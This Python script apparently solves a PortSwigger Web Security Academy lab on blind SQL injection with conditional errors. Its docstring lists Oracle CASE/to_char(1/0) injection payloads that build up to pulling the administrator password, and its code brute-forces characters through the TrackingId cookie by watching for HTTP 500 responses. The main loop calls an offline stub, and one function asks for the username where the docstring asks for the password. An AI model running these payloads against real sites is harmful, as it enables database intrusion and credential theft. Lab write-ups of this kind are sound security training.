import sys
import string
import time
from collections import defaultdict

import requests

import backoff

""" Exploiting blind SQL injection by triggering conditional errors
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

The original SQL-query is something like this:
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<TrackingId from cookie>'

https://portswigger.net/web-security/sql-injection/cheat-sheet
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual 

PoC: (put this in cookie as TrackingId)
Error response (HTTP 500):
xyz' union select case when (1=1) then to_char(1/0) else null end from dual -- 
Normal response (HTTP 200):
xyz' union select case when (1=2) then to_char(1/0) else null end from dual -- 

Together with original query
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'xyz' union select case when (1=1) then to_char(1/0) else null end from dual -- '

Evolution of exploit:
xyz' union select case when (1=1) then to_char(1/0) else null end from dual -- 
xyz' union select case when (SUBSTR('foobar', 1, 1) = 'x') then to_char(1/0) else null end from dual --
xyz' union select case when (SUBSTR((select username from users where username = 'administrator'), 1, 1) = 'a') then to_char(1/0) else null end from dual -- 
xyz' union select case when (SUBSTR((select password from users where username = 'administrator'), 1, 1) = 'v') then to_char(1/0) else null end from dual -- 
f"xyz' union select case when (SUBSTR((select password from users where username = 'administrator'), 1, {len(to_try)}) = '{to_try}') then to_char(1/0) else null end from dual"
"""

# TODO: change url to challenge url
url = "https://ac881f5a1f0f744480027588006700f4.web-security-academy.net/"


def bruteforce_password(candidates):
    """getting the password, one character at a time"""

    password = defaultdict(lambda: "?")

    pos = 0
    max_pos = sys.maxsize
    while pos < max_pos:
        pos += 1
        character = bruteforce_password_character_offline(candidates, pos)

        if type(character) == str:
            password[pos - 1] = character
            print(show_incomplete_password(password))
        else:
            max_pos = pos

    return password


def bruteforce_password_character(candidates, pos):
    for candidate in candidates:
        if try_candidate(pos, candidate):
            return candidate
    else:
        print(f" tried all candidates for position {pos}")
        return False


def bruteforce_password_character_offline(_candidates, pos):
    time.sleep(0.3)
    try:
        return "administrator"[pos - 1]
    except IndexError:
        return False


def try_candidate(pos, candidate):
    payload = f"xyz' union select case when (SUBSTR((select username from users where username = 'administrator'), {pos}, 1) = '{candidate}') then to_char(1/0) else null end from dual -- "
    # print(f"SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '{payload}'")
    return exploit(payload)


def exploit_on_backoff(_details):
    print("/", end="")


@backoff.on_exception(
    backoff.expo,
    requests.exceptions.RequestException,
    max_tries=8,
    on_backoff=exploit_on_backoff,
)
def exploit(payload):
    cookies = {"session": "whatever", "TrackingId": payload}

    with requests.get(url, cookies=cookies, timeout=3) as res:
        if res.status_code == 504:
            raise Exception("Server returned 504")

        if res.status_code != 500:
            print(".", end="")
            return False

        return True


def show_incomplete_password(password: defaultdict):
    ret = ""
    for char in range(max(password.keys()) + 1):
        ret += password[char]

    return ret


def get_candidates_alphanumeric():
    """this challenge only uses lowercase and numbers.
    To be sure - and for future copy/paste - don't forget the uppercase letters"""
    return string.ascii_lowercase + "0123456789" + string.ascii_uppercase


if __name__ == '__main__':
    candidates = get_candidates_alphanumeric()
    password = bruteforce_password(candidates)
    print(password)
